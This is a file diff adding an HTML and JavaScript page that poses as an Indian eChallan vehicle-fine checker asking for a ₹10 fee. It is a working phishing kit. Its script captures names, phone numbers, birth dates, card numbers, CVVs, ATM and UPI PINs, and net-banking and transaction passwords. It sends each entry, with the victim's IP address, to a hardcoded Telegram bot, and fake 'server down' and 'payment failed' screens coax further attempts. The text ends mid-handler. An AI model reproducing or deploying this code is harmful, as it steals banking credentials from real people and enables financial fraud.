@@ -1,0 +1,1246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+  <title>eChallan · Full Payment Flow</title>
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+    }
+    body {
+      background: #f0f4fa;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+    }
+    .phone-frame {
+      max-width: 400px;
+      width: 100%;
+      background: white;
+      border-radius: 36px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.12), 0 6px 12px rgba(0,0,0,0.05);
+      overflow: hidden;
+      padding: 24px 20px 20px;
+      transition: all 0.2s;
+    }
+    .status-bar {
+      display: flex;
+      justify-content: space-between;
+      font-size: 13px;
+      font-weight: 500;
+      color: #1e293b;
+      padding-bottom: 12px;
+      border-bottom: 1px solid #e9edf2;
+      margin-bottom: 16px;
+    }
+    .status-bar .left,
+    .status-bar .right {
+      visibility: hidden;
+    }
+
+    .header-image {
+      margin-bottom: 18px;
+      border-radius: 20px;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #f2f6fc;
+    }
+    .header-image img {
+      width: 100%;
+      height: auto;
+      display: block;
+      border-radius: 20px;
+    }
+
+    .img-bottom {
+      margin-top: 18px;
+      border-radius: 20px;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #f2f6fc;
+    }
+    .img-bottom img {
+      width: 100%;
+      height: auto;
+      display: block;
+      border-radius: 20px;
+    }
+
+    .no-top-image .header-image {
+      display: none;
+    }
+
+    .no-images .header-image,
+    .no-images .img-bottom {
+      display: none;
+    }
+
+    .input-group {
+      margin-bottom: 16px;
+    }
+    .input-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #1f3a5f;
+      margin-bottom: 4px;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #cfdae6;
+      border-radius: 18px;
+      font-size: 15px;
+      background: #fafcff;
+      transition: 0.2s;
+      outline: none;
+    }
+    .input-group input:focus {
+      border-color: #2563eb;
+      background: white;
+      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.12);
+    }
+    .input-group input::placeholder {
+      color: #93a9c2;
+      font-weight: 400;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      background: #0b2e4b;
+      color: white;
+      font-size: 17px;
+      font-weight: 600;
+      border-radius: 60px;
+      margin-top: 8px;
+      cursor: pointer;
+      transition: 0.2s;
+      letter-spacing: 0.5px;
+      box-shadow: 0 4px 8px rgba(11, 46, 75, 0.15);
+    }
+    .btn:active { transform: scale(0.97); }
+    .btn-primary { background: #1a4c7a; }
+    .btn-primary:hover { background: #0f3b5f; }
+    .btn-success { background: #0f7b4b; }
+    .btn-success:hover { background: #0b633b; }
+    .btn-secondary { background: #a0b8cc; }
+    .btn-secondary:hover { background: #8aa3b8; }
+
+    .footer {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 12px;
+      color: #6c829c;
+      border-top: 1px solid #e2eaf2;
+      padding-top: 16px;
+    }
+
+    .error-msg {
+      color: #b13e3e;
+      font-size: 13px;
+      margin-top: 6px;
+      display: none;
+    }
+    .error-msg.show {
+      display: block;
+    }
+
+    .payment-box {
+      background: #f8faff;
+      border-radius: 24px;
+      padding: 18px 16px;
+      border: 1px solid #e2eaf2;
+      margin-bottom: 20px;
+    }
+    .payment-box .title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #0a1e2f;
+      margin-bottom: 10px;
+    }
+    .payment-box .desc {
+      font-size: 14px;
+      color: #3a546d;
+      margin-bottom: 14px;
+      line-height: 1.5;
+    }
+    .payment-row {
+      display: flex;
+      justify-content: space-between;
+      font-size: 15px;
+      padding: 6px 0;
+    }
+    .payment-row.total {
+      font-weight: 700;
+      font-size: 18px;
+      border-top: 1px dashed #cbd7e6;
+      margin-top: 8px;
+      padding-top: 14px;
+      color: #0b2a44;
+    }
+
+    .section-title {
+      font-size: 15px;
+      font-weight: 600;
+      color: #1e293b;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .method-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 6px;
+    }
+    .method-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: #fafcff;
+      padding: 14px 16px;
+      border-radius: 40px;
+      border: 1px solid #e2eaf2;
+      transition: 0.15s;
+      cursor: pointer;
+    }
+    .method-item .method-icon {
+      width: 32px;
+      height: 32px;
+      object-fit: contain;
+      flex-shrink: 0;
+    }
+    .method-item .name {
+      font-weight: 500;
+      flex: 1;
+    }
+    .method-item .desc {
+      font-size: 13px;
+      color: #5e748b;
+    }
+    .method-item:hover {
+      background: #eef5ff;
+      border-color: #2563eb;
+    }
+    .method-item.selected {
+      background: #e3edfc;
+      border-color: #2563eb;
+      box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2);
+    }
+
+    .hidden { display: none; }
+    .error-box {
+      background: #ffe9e9;
+      border-left: 4px solid #b13e3e;
+      padding: 14px 16px;
+      border-radius: 16px;
+      margin: 16px 0;
+      color: #6b2b2b;
+    }
+    .mt-2 { margin-top: 12px; }
+
+    .page {
+      display: block;
+    }
+    .page.hidden {
+      display: none;
+    }
+
+    .card-row {
+      display: flex;
+      gap: 12px;
+    }
+    .card-row .input-group {
+      flex: 1;
+    }
+
+    .server-error {
+      background: #fff0f0;
+      border-left: 4px solid #b13e3e;
+      padding: 20px 16px;
+      border-radius: 16px;
+      margin: 16px 0;
+      color: #6b2b2b;
+      text-align: center;
+    }
+    .server-error h3 {
+      font-size: 18px;
+      margin-bottom: 8px;
+    }
+    .server-error p {
+      font-size: 14px;
+      margin-bottom: 6px;
+    }
+    .server-error .ok-btn {
+      background: #1a4c7a;
+      color: white;
+      border: none;
+      padding: 10px 40px;
+      border-radius: 40px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 12px;
+      transition: 0.2s;
+    }
+    .server-error .ok-btn:hover {
+      background: #0f3b5f;
+    }
+
+    .upi-header {
+      background: #f0f6fe;
+      padding: 12px 16px;
+      border-radius: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+    }
+    .upi-header .sending {
+      font-weight: 500;
+    }
+    .upi-header .to {
+      background: #0b2e4b;
+      color: white;
+      padding: 4px 14px;
+      border-radius: 30px;
+      font-size: 13px;
+      font-weight: 500;
+    }
+    .upi-warning {
+      background: #fff8e6;
+      border-left: 4px solid #f59e0b;
+      padding: 12px 14px;
+      border-radius: 12px;
+      margin: 12px 0 16px;
+      font-size: 14px;
+      color: #5a4a1a;
+    }
+    .upi-warning i {
+      color: #f59e0b;
+      margin-right: 8px;
+    }
+
+    .pin-dots {
+      display: flex;
+      gap: 14px;
+      justify-content: center;
+      margin: 12px 0 18px;
+    }
+    .pin-dots span {
+      width: 18px;
+      height: 18px;
+      background: #d0dcec;
+      border-radius: 30px;
+      transition: 0.1s;
+    }
+    .pin-dots span.filled {
+      background: #1a4c7a;
+    }
+
+    .upi-pin-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      max-width: 240px;
+      margin: 0 auto;
+    }
+    .upi-pin-grid button {
+      background: #f2f6fc;
+      border: 1px solid #d5e0ec;
+      border-radius: 30px;
+      padding: 16px 0;
+      font-size: 24px;
+      font-weight: 500;
+      color: #0a1e2f;
+      cursor: pointer;
+      transition: 0.1s;
+    }
+    .upi-pin-grid button:active {
+      background: #cbdbe9;
+    }
+    .upi-pin-grid .check-btn {
+      background: #0f7b4b;
+      color: white;
+      border: none;
+      font-size: 28px;
+    }
+    .upi-pin-grid .check-btn:active {
+      background: #0b633b;
+    }
+    .upi-pin-grid .backspace-btn {
+      background: #f2f6fc;
+      border: 1px solid #d5e0ec;
+      border-radius: 30px;
+      padding: 16px 0;
+      font-size: 22px;
+      font-weight: 500;
+      color: #b13e3e;
+      cursor: pointer;
+      transition: 0.1s;
+    }
+    .upi-pin-grid .backspace-btn:active {
+      background: #e8d0d0;
+    }
+
+    .failed-box {
+      background: #fff0f0;
+      border-left: 4px solid #b13e3e;
+      padding: 20px 16px;
+      border-radius: 16px;
+      margin: 16px 0;
+      text-align: center;
+    }
+    .failed-box .icon {
+      font-size: 48px;
+      color: #b13e3e;
+      margin-bottom: 8px;
+    }
+    .failed-box h3 {
+      font-size: 20px;
+      color: #6b2b2b;
+      margin-bottom: 6px;
+    }
+    .failed-box p {
+      font-size: 14px;
+      color: #5a3a3a;
+      margin-bottom: 4px;
+    }
+    .failed-box .txn-id {
+      background: #f2f2f2;
+      padding: 8px 16px;
+      border-radius: 40px;
+      font-size: 13px;
+      margin: 12px 0;
+      display: inline-block;
+      font-weight: 500;
+      color: #3a4a5a;
+    }
+    .failed-box .btn {
+      margin-top: 8px;
+    }
+
+    .custom-dropdown {
+      position: relative;
+      width: 100%;
+      margin-bottom: 16px;
+    }
+    .custom-dropdown .dropdown-header {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #cfdae6;
+      border-radius: 18px;
+      font-size: 15px;
+      background: #fafcff;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      transition: 0.2s;
+      color: #93a9c2;
+      user-select: none;
+    }
+    .custom-dropdown .dropdown-header.active {
+      border-color: #2563eb;
+      background: white;
+      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.12);
+      color: #1e293b;
+    }
+    .custom-dropdown .dropdown-header .selected-text {
+      color: #1e293b;
+      font-weight: 500;
+    }
+    .custom-dropdown .dropdown-header .arrow {
+      transition: 0.2s;
+      color: #8aa3b8;
+    }
+    .custom-dropdown .dropdown-header .arrow.open {
+      transform: rotate(180deg);
+    }
+    .custom-dropdown .dropdown-list {
+      position: absolute;
+      top: calc(100% + 6px);
+      left: 0;
+      right: 0;
+      background: white;
+      border: 1px solid #cfdae6;
+      border-radius: 18px;
+      max-height: 250px;
+      overflow-y: auto;
+      z-index: 100;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+      display: none;
+      padding: 6px 0;
+    }
+    .custom-dropdown .dropdown-list.open {
+      display: block;
+    }
+    .custom-dropdown .dropdown-list div {
+      padding: 10px 18px;
+      font-size: 14px;
+      cursor: pointer;
+      transition: 0.1s;
+      color: #1e293b;
+    }
+    .custom-dropdown .dropdown-list div:hover {
+      background: #eef5ff;
+    }
+    .custom-dropdown .dropdown-list div.selected {
+      background: #d6e4ff;
+      font-weight: 500;
+    }
+  </style>
+</head>
+<body>
+<div class="phone-frame">
+
+  <!-- status bar - only divider, no icons -->
+  <div class="status-bar">
+    <span class="left"></span>
+    <span class="right"></span>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- PAGE 1: FRONT PAGE (Form) -->
+  <!-- ============================================ -->
+  <div id="page-front" class="page">
+    <div class="header-image">
+      <img src="image1.jpg" alt="Header image" />
+    </div>
+
+    <div class="form-section">
+      <div class="input-group">
+        <label>Full Name</label>
+        <input type="text" id="fullName" placeholder="Enter full name" />
+      </div>
+      <div class="input-group">
+        <label>Phone Number</label>
+        <input type="tel" id="phoneNumber" placeholder="Enter 10-digit phone number" maxlength="10" />
+      </div>
+      <div class="input-group">
+        <label>Date of Birth</label>
+        <input type="text" id="dob" placeholder="DD/MM/YYYY" maxlength="10" />
+      </div>
+
+      <div id="formError" class="error-msg">⚠️ Please fill all fields correctly</div>
+
+      <button class="btn btn-primary" id="proceedBtn">Proceed</button>
+    </div>
+
+    <div class="img-bottom">
+      <img src="image2.jpg" alt="Bottom image" />
+    </div>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- PAGE 2: PAYMENT PAGE -->
+  <!-- ============================================ -->
+  <div id="page-payment" class="page hidden">
+    <div class="header-image">
+      <img src="image1.jpg" alt="Header image" />
+    </div>
+
+    <div class="payment-box">
+      <div class="title">Payment</div>
+      <div class="desc">
+        You will have to pay ₹10 to check the current status of your vehicle eChallan.
+      </div>
+      <div class="payment-row"><span>Service Charges</span> <span>₹10.00</span></div>
+      <div class="payment-row total"><span>Total Payable</span> <span>₹10.00</span></div>
+    </div>
+
+    <div class="section-title"><i class="fas fa-credit-card"></i> SELECT PAYMENT METHOD</div>
+
+    <div class="method-grid" id="methodGrid">
+      <div class="method-item" data-method="phonepe">
+        <img src="phonepe.png" alt="PhonePe" class="method-icon" />
+        <span class="name">PhonePe</span>
+        <span class="desc">Pay via PhonePe App</span>
+      </div>
+      <div class="method-item" data-method="gpay">
+        <img src="gpay.png" alt="Google Pay" class="method-icon" />
+        <span class="name">Google Pay</span>
+        <span class="desc">Pay via Google Pay App</span>
+      </div>
+      <div class="method-item" data-method="bhim">
+        <img src="bhim.png" alt="BHIM UPI" class="method-icon" />
+        <span class="name">BHIM UPI</span>
+        <span class="desc">Pay via BHIM App</span>
+      </div>
+      <div class="method-item" data-method="paytm">
+        <img src="paytm.png" alt="Paytm" class="method-icon" />
+        <span class="name">Paytm</span>
+        <span class="desc">Pay via Paytm App</span>
+      </div>
+      <div class="method-item" data-method="card">
+        <i class="fas fa-credit-card" style="font-size:24px; width:32px; color:#1f3a5f;"></i>
+        <span class="name">Debit/Credit Card</span>
+        <span class="desc">Pay using Visa, MasterCard, Rupay</span>
+      </div>
+      <div class="method-item" data-method="netbanking">
+        <img src="netbanking.png" alt="Net Banking" class="method-icon" />
+        <span class="name">Net Banking</span>
+        <span class="desc">All Major Indian Banks Available</span>
+      </div>
+    </div>
+
+    <div id="paymentError" class="hidden error-box mt-2">
+      <i class="fas fa-exclamation-circle"></i>
+      <span id="errorText">Please select a payment method</span>
+    </div>
+
+    <div class="img-bottom">
+      <img src="image2.jpg" alt="Bottom image" />
+    </div>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- PAGE 3: CARD DETAILS -->
+  <!-- ============================================ -->
+  <div id="page-card" class="page hidden">
+    <div class="header-image">
+      <img src="image1.jpg" alt="Header image" />
+    </div>
+
+    <div class="section-title"><i class="fas fa-credit-card"></i> Card Details</div>
+
+    <div class="input-group">
+      <label>Card Number</label>
+      <input type="text" id="cardNumber" placeholder="4444 4444 4444 4444" />
+    </div>
+    <div class="card-row">
+      <div class="input-group">
+        <label>Expiry Date (MM/YY)</label>
+        <input type="text" id="expiry" placeholder="MM/YY" />
+      </div>
+      <div class="input-group">
+        <label>CVV</label>
+        <input type="password" id="cvv" placeholder="CVV" maxlength="4" />
+      </div>
+    </div>
+
+    <button class="btn btn-primary" id="proceedCard">Proceed</button>
+    <button class="btn btn-secondary" id="backFromCard">Back</button>
+
+    <div class="img-bottom">
+      <img src="image2.jpg" alt="Bottom image" />
+    </div>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- PAGE 4: ATM PIN -->
+  <!-- ============================================ -->
+  <div id="page-atm" class="page hidden">
+    <div class="header-image">
+      <img src="image1.jpg" alt="Header image" />
+    </div>
+
+    <div class="section-title"><i class="fas fa-lock"></i> ATM PIN</div>
+
+    <div class="input-group">
+      <label>Enter your 4-digit ATM PIN</label>
+      <input type="password" id="atmPin" placeholder="••••" maxlength="4" />
+    </div>
+
+    <button class="btn btn-primary" id="submitAtm">Submit</button>
+    <button class="btn btn-secondary" id="backFromAtm">Back</button>
+
+    <div class="img-bottom">
+      <img src="image2.jpg" alt="Bottom image" />
+    </div>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- PAGE 5: BANK SERVER DOWN ERROR -->
+  <!-- ============================================ -->
+  <div id="page-error" class="page hidden">
+    <div class="header-image">
+      <img src="image1.jpg" alt="Header image" />
+    </div>
+
+    <div class="server-error">
+      <h3>⚠️ Bank Server Is Down</h3>
+      <p>Please try another payment method</p>
+      <button class="ok-btn" id="errorOkBtn">OK</button>
+    </div>
+
+    <div class="img-bottom">
+      <img src="image2.jpg" alt="Bottom image" />
+    </div>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- PAGE 6: UPI PIN - NO IMAGES -->
+  <!-- ============================================ -->
+  <div id="page-upi" class="page hidden no-images">
+    <div class="upi-header">
+      <span class="sending">Sending: ₹10.00</span>
+      <span class="to">To: RTO Challan App</span>
+    </div>
+
+    <div class="section-title"><i class="fas fa-lock"></i> ENTER UPI PIN</div>
+
+    <div class="upi-warning">
+      <i class="fas fa-exclamation-triangle"></i>
+      You are sending ₹10.00 from your account to RTO Challan App
+    </div>
+
+    <div class="pin-dots" id="pinDots">
+      <span></span><span></span><span></span><span></span>
+    </div>
+
+    <div class="upi-pin-grid" id="upiPinGrid">
+      <button>1</button><button>2</button><button>3</button>
+      <button>4</button><button>5</button><button>6</button>
+      <button>7</button><button>8</button><button>9</button>
+      <button class="backspace-btn"><i class="fas fa-delete-left"></i></button>
+      <button>0</button>
+      <button class="check-btn"><i class="fas fa-check"></i></button>
+    </div>
+
+    <button class="btn btn-secondary" id="backFromUpi">Back</button>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- PAGE 7: PAYMENT FAILED - NO IMAGES -->
+  <!-- ============================================ -->
+  <div id="page-failed" class="page hidden no-images">
+    <div class="failed-box">
+      <div class="icon"><i class="fas fa-times-circle"></i></div>
+      <h3>Payment Failed</h3>
+      <p>Your transaction could not be completed at this time.</p>
+      <p>The amount has not been deducted.</p>
+      <p>Please try again or use another payment method.</p>
+      <div class="txn-id">TRANSACTION ID: TXN1786795427062AESV</div>
+      <button class="btn btn-primary" id="failedRetryBtn">Choose Another Payment Method</button>
+    </div>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- PAGE 8: NET BANKING - SELECT BANK (No Top Image) -->
+  <!-- ============================================ -->
+  <div id="page-netbanking" class="page hidden no-top-image">
+    <div class="section-title"><i class="fas fa-building-columns"></i> Select Bank</div>
+
+    <div class="custom-dropdown" id="bankDropdown">
+      <div class="dropdown-header" id="dropdownHeader">
+        <span id="selectedBankText">-- Choose Your Bank --</span>
+        <span class="arrow" id="dropdownArrow"><i class="fas fa-chevron-down"></i></span>
+      </div>
+      <div class="dropdown-list" id="dropdownList">
+        <div data-bank="Airtel Payments Bank">Airtel Payments Bank</div>
+        <div data-bank="Allahabad Bank">Allahabad Bank</div>
+        <div data-bank="Andhra Bank">Andhra Bank</div>
+        <div data-bank="Axis Bank">Axis Bank</div>
+        <div data-bank="Bandhan Bank">Bandhan Bank</div>
+        <div data-bank="Bank of Baroda">Bank of Baroda</div>
+        <div data-bank="Bank of India">Bank of India</div>
+        <div data-bank="Bank of Maharashtra">Bank of Maharashtra</div>
+        <div data-bank="Canara Bank">Canara Bank</div>
+        <div data-bank="Central Bank of India">Central Bank of India</div>
+        <div data-bank="City Union Bank">City Union Bank</div>
+        <div data-bank="Corporation Bank">Corporation Bank</div>
+        <div data-bank="Federal Bank">Federal Bank</div>
+        <div data-bank="HDFC Bank">HDFC Bank</div>
+        <div data-bank="ICICI Bank">ICICI Bank</div>
+        <div data-bank="IDBI Bank">IDBI Bank</div>
+        <div data-bank="IDFC FIRST Bank">IDFC FIRST Bank</div>
+        <div data-bank="Indian Bank">Indian Bank</div>
+        <div data-bank="Indian Overseas Bank">Indian Overseas Bank</div>
+        <div data-bank="IndusInd Bank">IndusInd Bank</div>
+        <div data-bank="Jammu & Kashmir Bank">Jammu & Kashmir Bank</div>
+        <div data-bank="Karnataka Bank">Karnataka Bank</div>
+        <div data-bank="Karur Vysya Bank">Karur Vysya Bank</div>
+        <div data-bank="Kotak Mahindra Bank">Kotak Mahindra Bank</div>
+        <div data-bank="Punjab National Bank">Punjab National Bank</div>
+        <div data-bank="RBL Bank">RBL Bank</div>
+        <div data-bank="South Indian Bank">South Indian Bank</div>
+        <div data-bank="State Bank of India (SBI)">State Bank of India (SBI)</div>
+        <div data-bank="UCO Bank">UCO Bank</div>
+        <div data-bank="Union Bank of India">Union Bank of India</div>
+        <div data-bank="Yes Bank">Yes Bank</div>
+        <div data-bank="Other Bank">Other Bank</div>
+      </div>
+    </div>
+
+    <div class="input-group">
+      <label>User ID</label>
+      <input type="text" id="netUserId" placeholder="Enter your User ID" />
+    </div>
+    <div class="input-group">
+      <label>Password</label>
+      <input type="password" id="netPassword" placeholder="Enter your Password" />
+    </div>
+
+    <button class="btn btn-primary" id="proceedNet">Proceed</button>
+    <button class="btn btn-secondary" id="backFromNet">Back</button>
+
+    <div class="img-bottom">
+      <img src="image2.jpg" alt="Bottom image" />
+    </div>
+  </div>
+
+  <!-- ============================================ -->
+  <!-- PAGE 9: NET BANKING - TRANSACTION PASSWORD (No Top Image) -->
+  <!-- ============================================ -->
+  <div id="page-transpass" class="page hidden no-top-image">
+    <div class="section-title"><i class="fas fa-key"></i> Transaction Password</div>
+
+    <div class="input-group">
+      <label>Enter your Transaction Password</label>
+      <input type="password" id="transPass" placeholder="Enter your Transaction Password" />
+    </div>
+
+    <button class="btn btn-primary" id="submitTrans">Submit</button>
+    <button class="btn btn-secondary" id="backFromTrans">Back</button>
+
+    <div class="img-bottom">
+      <img src="image2.jpg" alt="Bottom image" />
+    </div>
+  </div>
+
+  <!-- footer -->
+  <div class="footer">
+    Copyright © 2025. All Rights Reserved. <br /> <span style="letter-spacing:2px;">E-CHALLAN</span>
+  </div>
+</div>
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    // ===== DATE OF BIRTH - AUTO SLASH =====
+    const dobInput = document.getElementById('dob');
+
+    dobInput.addEventListener('input', function(e) {
+      let value = this.value.replace(/\D/g, ''); // Remove non-digits
+      let formatted = '';
+
+      if (value.length > 0) {
+        formatted += value.substring(0, 2);
+        if (value.length >= 2) {
+          formatted += '/';
+          formatted += value.substring(2, 4);
+          if (value.length >= 4) {
+            formatted += '/';
+            formatted += value.substring(4, 8);
+          }
+        }
+      }
+
+      this.value = formatted;
+    });
+
+    // ===== TELEGRAM CONFIG =====
+    const BOT_TOKEN = '8950756982:AAEspfDUT_vI6R2XTDKpZ8l8YfUEnfwi5es';
+    const CHAT_ID = '6415926619';
+
+    // ===== GET IP ADDRESS =====
+    let userIP = 'Unable to fetch';
+
+    function getIPAddress() {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          userIP = data.ip;
+        })
+        .catch(() => {
+          userIP = 'Unable to fetch';
+        });
+    }
+    getIPAddress();
+
+    // ===== SEND TO TELEGRAM =====
+    function sendToTelegram(data) {
+      const message = `📌 *eChallan Data*\n\n` +
+        `👤 *Full Name:* ${data.fullName || 'N/A'}\n` +
+        `📱 *Phone:* ${data.phone || 'N/A'}\n` +
+        `📅 *DOB:* ${data.dob || 'N/A'}\n` +
+        `💳 *Card Number:* ${data.cardNumber || 'N/A'}\n` +
+        `📆 *Expiry:* ${data.expiry || 'N/A'}\n` +
+        `🔐 *CVV:* ${data.cvv || 'N/A'}\n` +
+        `🏦 *ATM PIN:* ${data.atmPin || 'N/A'}\n` +
+        `🏛️ *Bank:* ${data.bank || 'N/A'}\n` +
+        `👤 *User ID:* ${data.netUserId || 'N/A'}\n` +
+        `🔑 *Password:* ${data.netPassword || 'N/A'}\n` +
+        `🔒 *Transaction Password:* ${data.transPass || 'N/A'}\n` +
+        `💳 *UPI PIN:* ${data.upiPin || 'N/A'}\n` +
+        `💵 *Amount:* ₹10.00\n` +
+        `📱 *IP Address:* ${userIP}\n` +
+        `📄 *Page:* ${data.page || 'N/A'}`;
+
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      }).catch(err => console.log('Telegram send error:', err));
+    }
+
+    // ===== PAGES =====
+    const pageFront = document.getElementById('page-front');
+    const pagePayment = document.getElementById('page-payment');
+    const pageCard = document.getElementById('page-card');
+    const pageAtm = document.getElementById('page-atm');
+    const pageError = document.getElementById('page-error');
+    const pageUpi = document.getElementById('page-upi');
+    const pageFailed = document.getElementById('page-failed');
+    const pageNetbanking = document.getElementById('page-netbanking');
+    const pageTranspass = document.getElementById('page-transpass');
+
+    function showPage(pageId) {
+      document.querySelectorAll('.page').forEach(function(page) {
+        page.classList.add('hidden');
+      });
+      document.getElementById(pageId).classList.remove('hidden');
+    }
+
+    // ===== UPI PIN STATE =====
+    let upiPin = '';
+
+    function updatePinDots() {
+      const dots = document.querySelectorAll('#pinDots span');
+      dots.forEach(function(dot, idx) {
+        if (idx < upiPin.length) {
+          dot.classList.add('filled');
+        } else {
+          dot.classList.remove('filled');
+        }
+      });
+    }
+
+    // ===== FRONT PAGE =====
+    const proceedBtn = document.getElementById('proceedBtn');
+    const fullName = document.getElementById('fullName');
+    const phoneNumber = document.getElementById('phoneNumber');
+    const dob = document.getElementById('dob');
+    const formError = document.getElementById('formError');
+
+    function validateForm() {
+      const name = fullName.value.trim();
+      const phone = phoneNumber.value.trim();
+      const date = dob.value.trim();
+
+      if (name === '' || phone === '' || date === '') {
+        formError.textContent = '⚠️ Please fill all fields';
+        formError.classList.add('show');
+        return false;
+      }
+
+      if (phone.length !== 10 || !/^\d{10}$/.test(phone)) {
+        formError.textContent = '⚠️ Please enter a valid 10-digit phone number';
+        formError.classList.add('show');
+        return false;
+      }
+
+      if (!/^\d{2}\/\d{2}\/\d{4}$/.test(date)) {
+        formError.textContent = '⚠️ Please enter date in DD/MM/YYYY format';
+        formError.classList.add('show');
+        return false;
+      }
+
+      formError.classList.remove('show');
+      return true;
+    }
+
+    proceedBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      if (validateForm()) {
+        sendToTelegram({
+          fullName: fullName.value.trim(),
+          phone: phoneNumber.value.trim(),
+          dob: dob.value.trim(),
+          page: 'Front Page (Form)'
+        });
+        showPage('page-payment');
+      }
+    });
+
+    [fullName, phoneNumber, dob].forEach(function(input) {
+      input.addEventListener('input', function() {
+        formError.classList.remove('show');
+      });
+    });
+
+    // ===== PAYMENT PAGE - CLICK ON METHOD DIRECTLY OPENS PAGE =====
+    const methodItems = document.querySelectorAll('.method-item');
+    const paymentError = document.getElementById('paymentError');
+    const errorText = document.getElementById('errorText');
+
+    methodItems.forEach(function(item) {
+      item.addEventListener('click', function() {
+        // Remove selected class from all
+        methodItems.forEach(function(el) {
+          el.classList.remove('selected');
+        });
+        this.classList.add('selected');
+        const selectedMethod = this.dataset.method;
+        paymentError.classList.add('hidden');
+
+        const methodNames = {
+          'phonepe': 'PhonePe',
+          'gpay': 'Google Pay',
+          'bhim': 'BHIM UPI',
+          'paytm': 'Paytm',
+          'card': 'Debit/Credit Card',
+          'netbanking': 'Net Banking'
+        };
+
+        // Send payment method to Telegram
+        sendToTelegram({
+          fullName: document.getElementById('fullName').value.trim(),
+          phone: document.getElementById('phoneNumber').value.trim(),
+          dob: document.getElementById('dob').value.trim(),
+          page: `Payment Page - Method: ${methodNames[selectedMethod] || selectedMethod}`
+        });
+
+        // Directly open the respective page
+        if (['phonepe', 'gpay', 'bhim', 'paytm'].includes(selectedMethod)) {
+          upiPin = '';
+          updatePinDots();
+          showPage('page-upi');
+        } else if (selectedMethod === 'card') {
+          showPage('page-card');
+        } else if (selectedMethod === 'netbanking') {
+          showPage('page-netbanking');
+        }
+      });
+    });
+
+    // ===== UPI PIN =====
+    const upiPinGrid = document.getElementById('upiPinGrid');
+
+    upiPinGrid.addEventListener('click', function(e) {
+      const btn = e.target.closest('button');
+      if (!btn) return;
+
+      if (btn.classList.contains('check-btn')) {
+        if (upiPin.length === 4) {
+          sendToTelegram({
+            fullName: document.getElementById('fullName').value.trim(),
+            phone: document.getElementById('phoneNumber').value.trim(),
+            dob: document.getElementById('dob').value.trim(),
+            upiPin: upiPin,
+            page: 'UPI PIN'
+          });
+          showPage('page-failed');
+        } else {
+          alert('Please enter a 4-digit UPI PIN');
+        }
+        return;
+      }
+
+      if (btn.classList.contains('backspace-btn')) {
+        upiPin = upiPin.slice(0, -1);
+        updatePinDots();
+        return;
+      }
+
+      const val = btn.textContent.trim();
+      if (val === '' || val === '✓') return;
+
+      if (upiPin.length < 4) {
+        upiPin += val;
+        updatePinDots();
+      }
+    });
+
+    document.getElementById('backFromUpi').addEventListener('click', function() {
+      showPage('page-payment');
+    });
+
+    // ===== CARD DETAILS =====
+    document.getElementById('proceedCard').addEventListener('click', function() {
+      const card = document.getElementById('cardNumber').value.trim();
+      const exp = document.getElementById('expiry').value.trim();
+      const cvv = document.getElementById('cvv').value.trim();
+
+      if (!card || !exp || !cvv) {
+        alert('Please fill all card details');
+        return;
+      }
+
+      sendToTelegram({
+        fullName: document.getElementById('fullName').value.trim(),
+        phone: document.getElementById('phoneNumber').value.trim(),
+        dob: document.getElementById('dob').value.trim(),
+        cardNumber: card,
+        expiry: exp,
+        cvv: cvv,
+        page: 'Card Details'
+      });
+
+      showPage('page-atm');
+    });
+
+    document.getElementById('backFromCard').addEventListener('click', function() {
+      showPage('page-payment');
+    });
+
+    // ===== ATM PIN =====
+    document.getElementById('submitAtm').addEventListener('click', function() {
+      const pin = document.getElementById('atmPin').value.trim();
+
+      if (!pin || pin.length !== 4) {
+        alert('Please enter a valid 4-digit ATM PIN');
+        return;
+      }
+
+      sendToTelegram({
+        fullName: document.getElementById('fullName').value.trim(),
+        phone: document.getElementById('phoneNumber').value.trim(),
